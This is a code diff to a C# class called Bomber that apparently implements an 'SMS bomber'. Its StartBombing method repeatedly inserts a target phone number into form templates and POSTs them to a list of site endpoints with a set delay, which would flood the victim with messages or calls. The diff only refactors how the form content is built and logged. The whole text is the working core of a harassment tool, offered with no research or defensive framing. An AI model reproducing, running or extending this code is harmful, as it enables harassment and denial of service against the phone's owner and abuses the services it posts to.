@@ -10,12 +10,6 @@ namespace xv1Bomb
 {
     public class Bomber
     {
-        private readonly ILogger<Bomber> _logger;
-
-        /*public Bomber(ILogger<Bomber> logger) {
-            _logger = logger;
-        }*/
-
         public async Task StartBombing(string phoneNumber,CancellationToken ct ,int repeat,int delay)
         {
             HttpClient client = new HttpClient();
@@ -25,23 +19,19 @@ namespace xv1Bomb
                 {
                     if (!ct.IsCancellationRequested)
                     {
-                        var content = makeContent(phoneNumber, site.json);
-                        await client.PostAsync(site.link, content);
+                        var json = site.json.Replace("@",phoneNumber);
+                        var content = new FormUrlEncodedContent(JsonConvert.DeserializeObject<Dictionary<string,string>>(json));
+                        var resp = await client.PostAsync(site.link, content);
                         
                         Console.ForegroundColor = ConsoleColor.DarkMagenta;
                         Console.WriteLine(site.link);
                         Console.ForegroundColor = ConsoleColor.White;
+                        Console.WriteLine(resp.ToString());
 
                         Thread.Sleep(delay);
                     } else break;
                 }
             }
-        }
-
-        FormUrlEncodedContent makeContent(string phoneNumber, string json) {
-            json = json.Replace("@", phoneNumber);
-            Console.WriteLine(json);
-            return new FormUrlEncodedContent(JsonConvert.DeserializeObject<Dictionary<string,string>>(json));
         }
     }
 }
